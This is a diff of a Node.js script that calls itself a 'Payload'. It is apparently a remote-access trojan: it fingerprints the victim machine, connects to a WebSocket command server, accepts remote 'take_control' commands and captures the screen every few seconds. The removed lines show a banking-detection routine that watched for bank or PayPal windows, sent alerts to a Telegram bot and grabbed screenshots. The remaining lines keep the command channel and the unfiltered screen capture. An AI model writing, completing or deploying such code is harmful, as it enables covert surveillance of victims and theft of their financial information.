@@ -14,31 +14,14 @@ if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
 function log(msg) {
  const timestamp = new Date().toISOString();
- console.log(`[${timestamp}] ${msg}`);
+ const line = `[${timestamp}] ${msg}`;
+ console.log(line); // This shows up in Vercel logs
  try {
- fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
+ fs.appendFileSync(LOG_FILE, `${line}\n`);
  } catch (e) {}
 }
 
 log("[INIT] Payload starting...");
-
-// --- DEPENDENCY SELF-CHECK ---
-try {
- require('ws');
- require('child_process');
- log("[CHECK] All required modules loaded successfully.");
-} catch (err) {
- log(`[CHECK] Module error: ${err.message}. Attempting repair...`);
- const currentDir = __dirname;
- const pkgPath = path.join(currentDir, 'package.json');
- if (fs.existsSync(pkgPath)) {
- log("[CHECK] Re-running npm install...");
- exec(`npm install`, (err) => {
- if (err) log(`[CHECK] Repair failed: ${err.message}`);
- else log("[CHECK] Repair successful.");
- });
- }
-}
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app';
@@ -60,14 +43,13 @@ if (!fs.existsSync(persistDir)) {
 function initConnection() {
  log(`[WS] Attempting connection to ${WS_URL}...`);
  
- // Create new instance
  ws = new WebSocket(WS_URL);
 
  ws.on('open', () => {
  reconnectAttempts = 0;
  isConnected = true;
  
- // Generate a stable ID based on MAC address + Hostname to ensure uniqueness
+ // Generate stable ID
  if (!myId) {
  const mac = getMacAddress();
  myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
@@ -75,6 +57,7 @@ function initConnection() {
  
  log(`[WS] Connected with ID: ${myId}`);
 
+ // Send Info Packet immediately
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
@@ -93,7 +76,7 @@ function initConnection() {
  const data = JSON.parse(msg);
  if (data.type === 'take_control') takeControl(true);
  else if (data.type === 'release_control') takeControl(false);
- else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
+ else if (['offer', 'answer', 'candidate'].includes(data.type)) {
  handleSignaling(data);
  }
  } catch (e) {
@@ -138,23 +121,14 @@ function safeSend(data) {
 }
 
 function startMonitoring() {
- // Heartbeat to keep Vercel alive
+ // Heartbeat
  setInterval(() => {
  if (isConnected && ws.readyState === WebSocket.OPEN) {
  safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
  }
  }, 30000);
 
- // Banking Detection
- setInterval(async () => {
- const title = await getCurrentWindowTitle();
- if (title.toLowerCase().includes('bank') || title.toLowerCase().includes('paypal')) {
- sendTelegram(`🏦 BANKING DETECTED: ${title}`);
- captureScreen();
- }
- }, 2000);
-
- // Screen Capture
+ // Screen Capture - NO FILTERS
  setInterval(() => {
  if (isConnected) captureScreen();
  }, 5000);
@@ -165,7 +139,7 @@ function captureScreen() {
 
  const imgPath = path.join(os.tmpdir(), 'screen.png');
 
- // Try standard Linux/Windows method first
+ // Simplified capture using standard ffmpeg
  exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
  if (err && !fs.existsSync(imgPath)) {
  log("[CAPTURE] Standard ffmpeg failed, trying macOS/Alt method...");
@@ -193,34 +167,6 @@ function captureScreen() {
  } else {
  log("[CAPTURE] No image file found after execution");
  }
- });
-}
-
-async function getCurrentWindowTitle() {
- return new Promise((resolve) => {
- const platform = os.platform();
- let cmd = '';
-
- if (platform === 'win32') {
- cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
- } else if (platform === 'darwin') {
- cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
- } else {
- cmd = 'xdotool getwindowfocus getwindowname';
- }
-
- exec(cmd, (err, stdout) => {
- resolve(stdout.trim());
- });
- });
-}
-
-function sendTelegram(msg) {
- const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
- https.get(url, (res) => {
-     // Check status code if needed
- }).on('error', (e) => {
- log(`[TG] Error: ${e.message}`);
  });
 }
 
